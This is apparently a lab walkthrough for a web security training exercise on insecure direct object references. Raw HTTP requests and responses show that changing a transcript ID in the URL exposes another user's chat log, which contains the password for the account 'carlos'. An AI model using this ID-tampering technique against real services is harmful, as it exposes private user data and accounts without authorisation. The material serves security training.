---
tags:
  - authz
---
# Insecure direct object references

## Instructions

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user `carlos`, and logging into their account.

## Solution

This lab has a live chat functionality that allows downloading chat logs. Note the original chat below:

```text title="Original chat transcript"
GET /download-transcript/2.txt HTTP/1.1
Host: 0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net/chat
Connection: keep-alive
Cookie: session=u4v7AwzWpRT7ndqhIScxQr6Vig8KFD9P
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: orange
Priority: u=0


```

```text title="Original chat response"
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="2.txt"
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 44

CONNECTED: -- Now chatting with Hal Pline --
```

To solve this lab, change the 2 to a 1 and access another user's chat history. 

```text title="Modified request"
GET /download-transcript/1.txt HTTP/1.1
Host: 0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net/chat
Connection: keep-alive
Cookie: session=u4v7AwzWpRT7ndqhIScxQr6Vig8KFD9P
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: orange
Priority: u=0


```

Note the password in the response.

```text title="Modified response" hl_lines="13"
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is 4vtfrzk4f8dgw362vt9v. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!

```

Log in as carlos to solve the lab.

